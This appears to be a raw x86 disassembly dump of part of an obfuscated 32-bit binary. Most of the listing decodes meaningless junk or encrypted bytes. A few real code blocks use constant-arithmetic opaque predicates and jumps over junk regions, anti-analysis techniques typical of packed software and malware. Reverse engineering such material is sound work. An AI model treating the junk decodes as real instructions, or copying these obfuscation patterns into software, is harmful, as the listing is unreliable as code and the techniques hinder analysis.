  40bbfb:	mov    esi,0x699da857
  40bc00:	mov    ebx,0x96d6691
  40bc05:	inc    ecx
  40bc06:	pusha  
  40bc07:	add    DWORD PTR [edx-0x12],ebp
  40bc0a:	jnp    0x40bbfb
  40bc0c:	mov    bh,0xc3
  40bc0e:	(bad)  
  40bc0f:	data16 (bad) 
  40bc11:	mov    edi,0xae942265
  40bc16:	adc    esp,eax
  40bc18:	rcr    DWORD PTR [ecx+0x20],1
  40bc1b:	sbb    ecx,DWORD PTR [edi]
  40bc1d:	push   ebp
  40bc1e:	jo     0x40bc52
  40bc20:	in     al,0x9b
  40bc22:	sub    eax,0x1e1b0354
  40bc27:	jmp    0x6e33f26a
  40bc2c:	sti    
  40bc2d:	xchg   ecx,eax
  40bc2e:	call   0x4edb0543
  40bc33:	mov    BYTE PTR [edi-0x2611e60c],bl
  40bc39:	sub    esp,edx
  40bc3b:	inc    esp
  40bc3c:	jecxz  0x40bcbb
  40bc3e:	mul    DWORD PTR [edi+0x5d]
  40bc41:	jmp    0x5221a156
  40bc46:	(bad)  
  40bc47:	clc    
  40bc48:	cdq    
  40bc49:	mov    dl,0xf8
  40bc4b:	ror    ch,0xe5
  40bc4e:	out    0x2f,eax
  40bc50:	iret   
  40bc51:	xchg   BYTE PTR [ecx+eiz*8-0x29bfb5e],dl
  40bc58:	les    ebx,FWORD PTR [eax+0x3edca61]
  40bc5e:	mov    cl,0xfb
  40bc60:	mov    dl,0x35
  40bc62:	mov    dl,0x89
  40bc64:	dec    edx
  40bc65:	ds or  eax,0x6e0022bf
  40bc6b:	push   esp
  40bc6c:	jge    0x40bbff
  40bc6e:	mov    esi,0xe236f3fd
  40bc73:	mov    bl,0xa3
  40bc75:	add    eax,0xc21b55f1
  40bc7a:	mov    ch,0xc6
  40bc7c:	jp     0x40bc3f
  40bc7e:	ins    BYTE PTR es:[edi],dx
  40bc7f:	inc    eax
  40bc80:	lahf   
  40bc81:	inc    BYTE PTR [eax]
  40bc83:	enter  0x334e,0xe7
  40bc87:	sbb    BYTE PTR [edi+ebp*4+0x651ebf07],0x3a
  40bc8f:	inc    ecx
  40bc90:	jmp    0x40bc7d
  40bc92:	mov    ch,0xa4
  40bc94:	cmp    BYTE PTR [edx+ebx*1+0x72],ah
  40bc98:	adc    dl,BYTE PTR [esp+edi*1]
  40bc9b:	jg     0x40bce0
  40bc9d:	dec    ecx
  40bc9e:	xchg   edx,eax
  40bc9f:	and    al,0xe7
  40bca1:	sar    BYTE PTR [esi],cl
  40bca3:	in     eax,0x8b
  40bca5:	test   eax,0x5e265456
  40bcaa:	cmp    DWORD PTR [esi-0x80],ebp
  40bcad:	add    DWORD PTR [ebp+0x1b],ebp
  40bcb0:	fcom   QWORD PTR [ecx+0x0]
  40bcb3:	ss out 0x88,eax
  40bcb6:	mov    bh,0x5a
  40bcb8:	mov    bl,0x4b
  40bcba:	call   0xf748:0x54ec27a2
  40bcc1:	popa   
  40bcc2:	shl    BYTE PTR [eax+0x20],cl
  40bcc5:	out    0xf3,al
  40bcc7:	aaa    
  40bcc8:	daa    
  40bcc9:	sbb    eax,0x1141f00d
  40bcce:	retf   
  40bccf:	mov    dh,0xd5
  40bcd1:	mov    DWORD PTR [edi],ebp
  40bcd3:	fcomp  QWORD PTR [ecx+0x316245af]
  40bcd9:	fs adc eax,0x597a838e
  40bcdf:	mov    bl,0x3c
  40bce1:	add    eax,0x20af66e3
  40bce6:	call   0x36ad:0x302c644e
  40bced:	and    ebp,DWORD PTR [edx]
  40bcef:	xchg   ebp,eax
  40bcf0:	inc    edi
  40bcf1:	or     ch,BYTE PTR [ecx]
  40bcf3:	xchg   ecx,eax
  40bcf4:	mov    ah,0x2a
  40bcf6:	lahf   
  40bcf7:	stos   DWORD PTR es:[edi],eax
  40bcf8:	sar    ecx,0x3
  40bcfb:	sub    al,0x7d
  40bcfd:	sti    
  40bcfe:	add    BYTE PTR [eax-0x4a],dl
  40bd01:	push   es
  40bd02:	jmp    0x40bd40
  40bd04:	pop    esi
  40bd05:	adc    dl,BYTE PTR [ebp-0x5b23f2df]
  40bd0b:	das    
  40bd0c:	ret    0xc0ed
  40bd0f:	pop    esi
  40bd10:	test   edx,ebp
  40bd12:	dec    edx
  40bd13:	das    
  40bd14:	repz mov eax,0xa145709
  40bd1a:	fmul   DWORD PTR [ecx+ebp*8]
  40bd1d:	mov    ecx,0x8e130a83
  40bd22:	jecxz  0x40bd64
  40bd24:	frstor [eiz*1-0x1e667272]
  40bd2b:	inc    eax
  40bd2c:	jo     0x40bd98
  40bd2e:	jge    0x40bcf8
  40bd30:	aaa    
  40bd31:	and    al,0xc8
  40bd33:	xchg   ebx,eax
  40bd34:	mov    DWORD PTR [ebp-0x2c784eb7],edx
  40bd3a:	pop    ds
  40bd3b:	jae    0x40bcd1
  40bd3d:	jmp    0x678153af
  40bd42:	push   esp
  40bd43:	xchg   DWORD PTR [edx],esp
  40bd45:	adc    eax,0x5e4394bc
  40bd4a:	jl     0x40bd51
  40bd4c:	sahf   
  40bd4d:	dec    esp
  40bd4e:	xchg   BYTE PTR [ecx+0x3f],ch
  40bd51:	adc    BYTE PTR [edx-0x368c4a6f],0x88
  40bd58:	xchg   ecx,eax
  40bd59:	or     esi,0xffffff95
  40bd5c:	jbe    0x40bd0b
  40bd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd5f:	mov    al,0xe8
  40bd61:	inc    ah
  40bd63:	adc    BYTE PTR [esi+0x18acbc6],al
  40bd69:	mov    ah,al
  40bd6b:	jnp    0x40bd45
  40bd6d:	xchg   esp,eax
  40bd6e:	or     ecx,DWORD PTR [ebp-0x32]
  40bd71:	lods   eax,DWORD PTR ds:[esi]
  40bd72:	retf   
  40bd73:	stc    
  40bd74:	add    BYTE PTR [eax-0x49e50618],0x2d
  40bd7b:	mov    ah,0xe2
  40bd7d:	js     0x40bd1b
  40bd7f:	jbe    0x40bdc3
  40bd81:	adc    ebx,DWORD PTR [edi-0x71cbcbbd]
  40bd87:	out    dx,eax
  40bd88:	test   al,0xa
  40bd8a:	jle    0x40bd84
  40bd8c:	push   ecx
  40bd8d:	sbb    BYTE PTR [esi*1+0x34de9b2c],dl
  40bd94:	addr16 lahf 
  40bd96:	pop    edx
  40bd97:	and    DWORD PTR [eax+0x35],ecx
  40bd9a:	popf   
  40bd9b:	out    0x59,eax
  40bd9d:	jo     0x40bd91
  40bd9f:	and    DWORD PTR [eax-0x36],esi
  40bda2:	sbb    bl,BYTE PTR [eax+0x77de0d7a]
  40bda8:	cdq    
  40bda9:	(bad)  
  40bdaa:	pop    ecx
  40bdab:	ret    0x33c
  40bdae:	repz and BYTE PTR [esi],cl
  40bdb1:	xor    eax,0xf722e7ff
  40bdb6:	sub    eax,0x626d2840
  40bdbb:	sar    DWORD PTR [edi+0x1f1e80af],cl
  40bdc1:	lock in eax,0x4b
  40bdc4:	lock adc ebp,DWORD PTR [edx+ecx*4+0x74]
  40bdc9:	jmp    0x736bc88c
  40bdce:	or     esi,DWORD PTR [edi+0x52]
  40bdd1:	pop    edi
  40bdd2:	das    
  40bdd3:	call   0x71d1:0x939291d1
  40bdda:	mov    dl,0x80
  40bddc:	sar    BYTE PTR [ebp-0x15],1
  40bddf:	fidiv  WORD PTR [edx-0x1a]
  40bde2:	sub    DWORD PTR [eax+0x51],edi
  40bde5:	and    BYTE PTR [ecx+0x679624e],dl
  40bdeb:	ffreep st(2)
  40bded:	pop    esp
  40bdee:	push   0x76
  40bdf0:	jle    0x40bdaa
  40bdf2:	(bad)  
  40bdf3:	jmp    0xdfff:0x4a434e35
  40bdfa:	and    DWORD PTR [ebp+0x11],ebp
  40bdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdfe:	inc    esp
  40bdff:	mov    ch,BYTE PTR [esi]
  40be01:	push   ebx
  40be02:	pop    esi
  40be03:	xchg   esi,eax
  40be04:	or     DWORD PTR [ebp+0x58],esp
  40be07:	inc    ebp
  40be08:	fmul   DWORD PTR [ebx-0x12dbb0ee]
  40be0e:	inc    edi
  40be0f:	lock dec ecx
  40be11:	dec    ebp
  40be12:	jbe    0x40bda9
  40be14:	adc    ebp,DWORD PTR [esi+0x6f]
  40be17:	outs   dx,DWORD PTR ds:[esi]
  40be18:	lea    edx,[ebp+0x53]
  40be1b:	push   ecx
  40be1c:	arpl   WORD PTR [esi-0x746ffdac],bp
  40be22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be23:	cmc    
  40be24:	pusha  
  40be25:	data16 ins BYTE PTR es:[edi],dx
  40be27:	rcr    ecx,cl
  40be29:	sub    bh,ch
  40be2b:	xchg   ebx,eax
  40be2c:	lds    ebx,FWORD PTR [ebx+0x29]
  40be2f:	cvtps2pd xmm5,xmm5
  40be32:	xchg   edi,eax
  40be33:	pop    ss
  40be34:	in     eax,dx
  40be35:	arpl   WORD PTR [ecx+0x6c69fd2f],dx
  40be3b:	inc    esp
  40be3c:	rep lods al,BYTE PTR ds:[esi]
  40be3e:	jne    0x40be95
  40be40:	or     eax,0x5f36ae5c
  40be45:	or     esi,edi
  40be47:	jecxz  0x40be36
  40be49:	push   DWORD PTR [ecx]
  40be4b:	add    ecx,DWORD PTR [ecx-0x64ed7499]
  40be51:	mov    bl,0xa3
  40be53:	or     BYTE PTR [edx+0x314a3d2f],0x44
  40be5a:	jmp    0xe9f49f3a
  40be5f:	sar    cl,0x50
  40be62:	xor    dl,dh
  40be64:	and    DWORD PTR [edx+0x7f],0xb9adada2
  40be6b:	(bad)  
  40be6c:	(bad)  
  40be6d:	push   cs
  40be6e:	mov    edx,0x4b83b4f4
  40be73:	scas   eax,DWORD PTR es:[edi]
  40be74:	retf   0x8b4d
  40be77:	fsub   QWORD PTR [ebp-0x218bfb66]
  40be7d:	sahf   
  40be7e:	pop    es
  40be7f:	std    
  40be80:	xor    dh,bh
  40be82:	mov    BYTE PTR [ecx-0x111ff081],bh
  40be88:	mov    DWORD PTR [ebp-0xc],ecx
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bed6
  40bf55:	rol    BYTE PTR [ebx+0x6a],cl
  40bf58:	mov    dh,0x5
  40bf5a:	sbb    BYTE PTR [eax],bl
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    dh,bl
  40bf61:	repnz enter 0x5d26,0xd3
  40bf66:	and    dh,ah
  40bf68:	icebp  
  40bf69:	in     al,0x13
  40bf6b:	xor    cl,BYTE PTR [edi-0x7b]
  40bf6e:	cmp    eax,DWORD PTR [ecx-0x2e]
  40bf71:	mov    esi,0x9659a866
  40bf76:	mov    edi,0x10b92aec
  40bf7b:	dec    ecx
  40bf7c:	dec    esi
  40bf7d:	arpl   WORD PTR [edi-0x7f0ed732],bx
  40bf83:	dec    edx
  40bf84:	shl    DWORD PTR cs:[esi-0x19],1
  40bf88:	aad    0xd
  40bf8a:	mov    BYTE PTR [eax+0x78fa9849],bh
  40bf90:	cs sbb eax,0x9e5f482d
  40bf96:	and    DWORD PTR [edx],edi
  40bf98:	cs inc edx
  40bf9a:	mov    ebx,0xd49457db
  40bf9f:	adc    esi,DWORD PTR [edi]
  40bfa1:	out    dx,eax
  40bfa2:	dec    edx
  40bfa3:	sbb    al,0xd3
  40bfa5:	sub    eax,0x4de44080
  40bfaa:	fwait
  40bfab:	retf   0x32b6
  40bfae:	sbb    BYTE PTR [eax-0x40fadea2],dh
  40bfb4:	ins    BYTE PTR es:[edi],dx
  40bfb5:	call   0x5eef7058
  40bfba:	mov    ds:0xf416fb6,al
  40bfbf:	pusha  
  40bfc0:	inc    edi
  40bfc1:	in     al,0xdb
  40bfc3:	repz xor DWORD PTR [edi],ebp
  40bfc6:	xor    eax,0xed6e1774
  40bfcb:	adc    eax,0x78b0ee2e
  40bfd0:	inc    ebx
  40bfd1:	jmp    0x7562b2c9
  40bfd6:	dec    eax
  40bfd7:	or     BYTE PTR [ebp-0x6df131f2],ch
  40bfdd:	inc    edi
  40bfde:	inc    esi
  40bfdf:	sti    
  40bfe0:	call   0xf667:0x7d87a93a
  40bfe7:	jns    0x40bffe
  40bfe9:	fnstsw WORD PTR [eax]
  40bfeb:	out    dx,eax
  40bfec:	dec    ebp
  40bfed:	fistp  DWORD PTR [edx]
  40bfef:	(bad)  [edx-0x6a048348]
  40bff5:	leave  
  40bff6:	xor    BYTE PTR [ebx+0x6b],ch
  40bff9:	addr16 out 0x40,eax
  40bffc:	fst    QWORD PTR [edi+0xf]
  40bfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c000:	arpl   ax,sp
  40c002:	lods   eax,DWORD PTR ds:[esi]
  40c003:	mov    eax,0x5ac6030
  40c008:	push   esp
  40c009:	pop    ss
  40c00a:	adc    eax,0x154647bf
  40c00f:	jecxz  0x40c06c
  40c011:	shl    al,0xf3
  40c014:	xchg   esp,eax
  40c015:	(bad)  [ecx-0x7e]
  40c018:	jo     0x40c054
  40c01a:	test   eax,0x964d745d
  40c01f:	loope  0x40c018
  40c021:	(bad)
  40c024:	repnz add eax,0x5dac7f2b
  40c02a:	out    0x44,eax
  40c02c:	test   eax,0xf626ae89
  40c031:	pop    eax
  40c032:	xor    DWORD PTR [ebx-0x92f150b],ebp
  40c038:	mov    ebx,0x72c8e4a2
  40c03d:	ins    DWORD PTR es:[edi],dx
  40c03e:	inc    edi
  40c03f:	pop    edx
  40c040:	ds dec esi
  40c042:	sub    ebx,edx
  40c044:	xchg   ebp,eax
  40c045:	adc    DWORD PTR [ebx+ebx*4],ebp
  40c048:	xchg   ebp,eax
  40c049:	mov    esp,0xfd25dd31
  40c04e:	pusha  
  40c04f:	push   ebp
  40c050:	push   cs
  40c051:	sbb    BYTE PTR [edi+esi*4-0x143083c3],dh
  40c058:	cmovbe ebp,DWORD PTR [edi+0x2ee7220]
  40c05f:	mov    ah,0x75
  40c061:	stc    
  40c062:	cld    
  40c063:	mov    ecx,0x910031b1
  40c068:	push   edi
  40c069:	call   0x5165:0x45200062
  40c070:	imul   ecx,DWORD PTR [esi-0x19c3da77],0xffffff82
  40c077:	push   esp
  40c078:	outs   dx,BYTE PTR ds:[esi]
  40c079:	push   eax
  40c07a:	push   ebp
  40c07b:	or     al,0xb1
  40c07d:	and    al,0x69
  40c07f:	in     al,0x82
  40c081:	mov    ds:0xc51131a8,eax
  40c086:	pop    ebp
  40c087:	or     edx,0xffffffc5
  40c08a:	sbb    DWORD PTR ds:0xadd884cb,ebx
  40c090:	jo     0x40c0d1
  40c092:	cmp    DWORD PTR [edx-0x1dec877c],eax
  40c098:	fwait
  40c099:	call   0xe727:0xa083be2f
  40c0a0:	and    eax,DWORD PTR [edx-0x31]
  40c0a3:	retf   0xcf8
  40c0a6:	js     0x40c04c
  40c0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a9:	leave  
  40c0aa:	xchg   edi,eax
  40c0ab:	cmp    edi,eax
  40c0ad:	push   ecx
  40c0ae:	cwde   
  40c0af:	cmp    esi,esp
  40c0b1:	or     esi,DWORD PTR [edi-0x7e]
  40c0b4:	iret   
  40c0b5:	out    0xdf,al
  40c0b7:	mov    eax,0xf3e96de9
  40c0bc:	call   0xb9062a6
  40c0c1:	add    BYTE PTR [eax-0x76612e81],0x38
  40c0c8:	sbb    dl,BYTE PTR [edi+edx*4]
  40c0cb:	and    BYTE PTR [ebx+0x8],cl
  40c0ce:	jmp    0x7121ca26
  40c0d3:	std    
  40c0d4:	mov    ecx,0x9515cf0
  40c0d9:	addr16 mov edi,ss
  40c0dc:	mov    cl,0x3
  40c0de:	outs   dx,BYTE PTR ds:[esi]
  40c0df:	mov    al,0x78
  40c0e1:	push   ss
  40c0e2:	mov    esi,0x68d4e2ee
  40c0e7:	jo     0x40c164
  40c0e9:	jge    0x40c094
  40c0eb:	dec    eax
  40c0ec:	dec    edx
  40c0ed:	adc    al,0x87
  40c0ef:	mov    al,ds:0xd0040cd8
  40c0f4:	test   dh,0xc6
  40c0f7:	xchg   al,ch
  40c0f9:	fldcw  WORD PTR [ecx-0x20]
  40c0fc:	jp     0x40c0b2
  40c0fe:	xor    al,0x83
  40c100:	sub    eax,DWORD PTR [edx+esi*2-0x9]
  40c104:	iret   
  40c105:	das    
  40c106:	sub    DWORD PTR [edi+eax*4-0x2c4a8bc7],ebx
  40c10d:	int3   
  40c10e:	push   ss
  40c10f:	dec    eax
  40c110:	inc    edx
  40c111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c112:	mov    ch,0x80
  40c114:	or     al,0xd0
  40c116:	add    al,0x23
  40c118:	pop    ebp
  40c119:	mov    dl,0x3f
  40c11b:	and    edi,ebp
  40c11d:	xor    ah,BYTE PTR [edi-0xe1445cb]
  40c123:	xor    bh,BYTE PTR [ebp-0x3b]
  40c126:	jmp    0x40c16c
  40c128:	sub    ebp,DWORD PTR [ebp-0xb]
  40c12b:	push   edx
  40c12c:	sbb    DWORD PTR [eax-0x3324d2d],0xffffffd7
  40c133:	(bad)  
  40c134:	mov    esp,0x575d67d9
  40c139:	xchg   esp,eax
  40c13a:	pop    edx
  40c13b:	inc    ecx
  40c13c:	and    BYTE PTR [edx+0x6c14d997],cl
  40c142:	gs jl  0x40c1c3
  40c145:	mov    esp,0x8dc6bb29
  40c14a:	or     al,0x36
  40c14c:	test   BYTE PTR ds:0xd44a0f60,bh
  40c152:	call   0x6351b73a
  40c157:	out    0x2c,eax
  40c159:	imul   eax,DWORD PTR [ebx+ebp*2+0x73],0xdf7d5f09
  40c161:	inc    edi
  40c162:	loope  0x40c127
  40c164:	cmc    
  40c165:	dec    esp
  40c166:	mov    ch,0x2e
  40c168:	std    
  40c169:	jo     0x40c1b5
  40c16b:	inc    esp
  40c16c:	and    BYTE PTR [ebx],0x9a
  40c16f:	fwait
  40c170:	aaa    
  40c171:	push   0xffffffed
  40c173:	push   0xb899f239
  40c178:	mov    WORD PTR [ebp+0x1a],ss
  40c17b:	cmp    edi,ebp
  40c17d:	inc    ecx
  40c17e:	mov    eax,ds:0x90f0ed41
  40c183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c185:	nop
  40c186:	jecxz  0x40c17e
  40c188:	mov    ebx,fs
  40c18a:	jae    0x40c10c
  40c18c:	and    eax,0xe48a741
  40c191:	je     0x40c1ae
  40c193:	outs   dx,DWORD PTR ds:[esi]
  40c194:	(bad)  
  40c195:	and    eax,0x8c9e4a63
  40c19a:	in     al,0x57
  40c19c:	fild   QWORD PTR [esi+0x4483991c]
  40c1a2:	mov    gs,WORD PTR [edi+0x26]
  40c1a5:	hlt    
  40c1a6:	loope  0x40c1e9
  40c1a8:	mov    eax,ds:0x5acea2f0
  40c1ad:	lock ror DWORD PTR [eax],0xe0
  40c1b1:	sub    dh,BYTE PTR [edx+0x54]
  40c1b4:	ja     0x40c1dc
  40c1b6:	inc    ebx
  40c1b7:	mov    esp,0x821e7a97
  40c1bc:	in     eax,dx
  40c1bd:	mov    WORD PTR [ecx-0x1e],es
  40c1c0:	sbb    BYTE PTR [ebx+0x5074a1],bh
  40c1c6:	push   cs
  40c1c7:	out    dx,al
  40c1c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1c9:	ret    
  40c1ca:	stos   BYTE PTR es:[edi],al
  40c1cb:	pop    es
  40c1cc:	sbb    eax,0xab73a8bc
  40c1d1:	pusha  
  40c1d2:	ds ds dec edi
  40c1d5:	inc    esi
  40c1d6:	or     BYTE PTR [ebx-0x2e5993a],cl
  40c1dc:	adc    esi,DWORD PTR [edx-0xc1c1624]
  40c1e2:	add    ebx,DWORD PTR [ebp-0x4d]
  40c1e5:	xor    DWORD PTR [esi+0x54],ebx
  40c1e8:	jp     0x40c1e2
  40c1ea:	cmp    BYTE PTR [esi+0x55124523],bl
  40c1f0:	mov    al,fs:0x2d457217
  40c1f6:	mov    al,ss:0xf5bcfc56
  40c1fc:	xor    BYTE PTR [edi-0x69],bh
  40c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c200:	dec    edx
  40c201:	jb     0x40c236
  40c203:	jecxz  0x40c26d
  40c205:	xchg   edi,eax
  40c206:	xchg   edi,eax
  40c207:	lods   eax,DWORD PTR ds:[esi]
  40c208:	push   0xdd31e3d7
  40c20d:	std    
  40c20e:	call   0x603f:0xc41994c5
  40c215:	mov    ebx,0x8915df03
  40c21a:	inc    ebx
  40c21b:	(bad)  
  40c21c:	cmp    al,0xda
  40c21e:	loope  0x40c1b2
  40c220:	xchg   BYTE PTR [edx+esi*2],dl
  40c223:	xchg   edi,eax
  40c224:	rol    BYTE PTR [edx*8+0x505bed0f],1
  40c22b:	inc    esi
  40c22c:	cmc    
  40c22d:	out    dx,eax
  40c22e:	(bad)  
  40c22f:	aam    0x80
  40c231:	or     ax,0xc43
  40c235:	(bad)  
  40c236:	hlt    
  40c237:	aam    0xef
  40c239:	test   BYTE PTR [edx],0x6a
  40c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c23d:	or     edx,DWORD PTR [edi+0x7a]
  40c240:	sub    eax,0xfe19e476
  40c245:	popa   
  40c246:	cmp    edi,DWORD PTR [ebp+0x148bace]
  40c24c:	dec    edi
  40c24d:	lahf   
  40c24e:	push   ds
  40c24f:	xor    BYTE PTR [edi-0x6334031f],dl
  40c255:	or     eax,0x6ea6d550
  40c25a:	jne    0x40c2b0
  40c25c:	jp     0x40c24c
  40c25e:	icebp  
  40c25f:	adc    eax,0x8bb8e5b3
  40c264:	inc    edi
  40c265:	idiv   BYTE PTR [ebx]
  40c267:	inc    ebp
  40c268:	adc    ah,BYTE PTR [ebx-0x1abff21d]
  40c26e:	repz scas al,BYTE PTR es:[edi]
  40c270:	pop    edx
  40c271:	mov    bh,0x9b
  40c273:	fwait
  40c274:	lods   eax,DWORD PTR ds:[esi]
  40c275:	nop
  40c276:	mov    esp,0xe1b572f9
  40c27b:	rcr    DWORD PTR ds:0xbbd69c89,cl
  40c281:	jns    0x40c29f
  40c283:	idiv   BYTE PTR [ebx-0x6a4831b6]
  40c289:	daa    
  40c28a:	mov    esp,ds
  40c28c:	sahf   
  40c28d:	outs   dx,DWORD PTR ds:[esi]
  40c28e:	shl    BYTE PTR [edx+ebx*8-0x35dfb330],0xa4
  40c296:	aam    0xf6
  40c298:	mov    bl,0x5e
  40c29a:	cld    
  40c29b:	sbb    esi,esp
  40c29d:	aad    0xd5
  40c29f:	mov    dh,0x3
  40c2a1:	sub    BYTE PTR fs:[edx],al
  40c2a4:	test   al,0x61
  40c2a6:	jne    0x40c246
  40c2a8:	mov    edx,0x5015a001
  40c2ad:	sti    
  40c2ae:	mul    BYTE PTR [eax]
  40c2b0:	cs scas al,BYTE PTR es:[edi]
  40c2b2:	adc    eax,0x76366329
  40c2b7:	jbe    0x40c2d6
  40c2b9:	cmp    DWORD PTR [ebx],edx
  40c2bb:	cdq    
  40c2bc:	les    ebx,FWORD PTR [eax+0x3346cdcb]
  40c2c2:	call   0xc6983bc1
  40c2c7:	mov    edx,0xf1788540
  40c2cc:	mov    ebp,0x6cd0cc3d
  40c2d1:	jp     0x40c2ab
  40c2d3:	fidivr WORD PTR [edx-0x57]
  40c2d6:	add    eax,0x9de229e
  40c2db:	xor    BYTE PTR [ecx],cl
  40c2dd:	jne    0x40c281
  40c2df:	inc    edx
  40c2e0:	add    eax,0x5f801555
  40c2e5:	fs mov bh,0x44
  40c2e8:	cmp    BYTE PTR [eax],bh
  40c2ea:	out    dx,al
  40c2eb:	fbld   TBYTE PTR [esi-0x66]
  40c2ee:	adc    al,0x72
  40c2f0:	sbb    ebx,ecx
  40c2f2:	(bad)  
  40c2f3:	fistp  WORD PTR [eax+eiz*1-0x61]
  40c2f7:	test   DWORD PTR [ebx+eax*8+0x731e9f30],esp
  40c2fe:	test   DWORD PTR [ebx+0x799cc592],ecx
  40c304:	add    al,0xcc
  40c306:	push   0xfffffff4
  40c308:	or     dh,dh
  40c30a:	sbb    BYTE PTR [edx+0x43db07d2],dl
  40c310:	aad    0xac
  40c312:	lahf   
  40c313:	(bad)  
  40c314:	jmp    0xc3fb19a1
  40c319:	sbb    esp,edi
  40c31b:	cld    
  40c31c:	or     eax,edi
  40c31e:	repnz add BYTE PTR [esi-0x4118ad16],0xff
  40c326:	sbb    eax,DWORD PTR [edi+eiz*4-0x4a8e08e]
  40c32d:	mov    ebx,0x428fd482
  40c332:	jb     0x40c358
  40c334:	in     al,dx
  40c335:	add    ebp,esi
  40c337:	and    al,0xee
  40c339:	push   eax
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x4227ac
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422598
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x4227ac,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	cmp    al,0xda
  40c3d2:	mov    ds:0x18fd0dbc,eax
  40c3d7:	sbb    BYTE PTR [esi+0x12],ch
  40c3da:	sbb    BYTE PTR [eax],bl
  40c3dc:	lock push esi
  40c3de:	dec    eax
  40c3df:	loope  0x40c38a
  40c3e1:	xor    eax,eax
  40c3e3:	call   0xab8276a2
  40c3e8:	dec    ebx
  40c3e9:	test   eax,0x37ef44d8
  40c3ee:	mov    ebp,0x7b5bc1e3
  40c3f3:	cmp    DWORD PTR [edx-0x75cc1062],edi
  40c3f9:	xor    DWORD PTR [ecx],edx
  40c3fb:	push   ss
  40c3fc:	mov    ecx,0xfa012bdf
  40c401:	nop
  40c402:	xchg   edx,eax
  40c403:	shl    DWORD PTR [esi],cl
  40c405:	aaa    
  40c406:	les    ecx,FWORD PTR [ecx-0x4c233412]
  40c40c:	cdq    
